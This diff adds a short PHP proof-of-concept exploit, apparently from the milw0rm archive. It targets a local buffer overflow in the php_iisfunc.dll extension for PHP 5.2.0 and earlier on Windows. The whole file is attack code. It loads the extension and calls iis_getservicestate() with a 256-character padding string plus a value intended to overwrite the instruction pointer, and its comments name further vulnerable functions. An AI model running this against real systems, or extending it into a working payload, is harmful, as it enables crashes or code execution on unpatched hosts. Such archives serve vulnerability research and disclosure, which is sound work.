@@ -1,0 +1,32 @@
+<?php
+// ==================================================================================
+//
+//  php_iisfunc.dll PHP <= 5.2.0 (win32) Buffer Overflow PoC
+//
+//      Discovery: boecke <boecke@herzeleid.net>
+//      Risk: Local Buffer Overflow (Medium - High Risk)
+//      Notes: Various other functions are exploitable, all of which convert the
+//      string argument(s) to unicode.
+//
+//      extern "C" IISFUNC_API int fnStartService(LPCTSTR ServiceId);
+//      extern "C" IISFUNC_API int fnGetServiceState(LPCTSTR ServiceId);
+//      extern "C" IISFUNC_API int fnStopService(LPCTSTR ServiceId);
+//
+//      "Sangre, sonando, de rabia naci.. Who do you trust?"
+//       - Cygnus, Vismund Cygnus: Sarcophagi
+//
+// ==================================================================================
+
+if ( !extension_loaded( "iisfunc" ) )
+{
+       die( "Extension not loaded.\n" );
+}
+
+$buf_unicode = str_repeat( "A", 256 );
+$eip_unicode = "\x41\x41";
+
+iis_getservicestate( $buf_unicode . $eip_unicode );
+
+?>
+
+# milw0rm.com [2007-08-27]
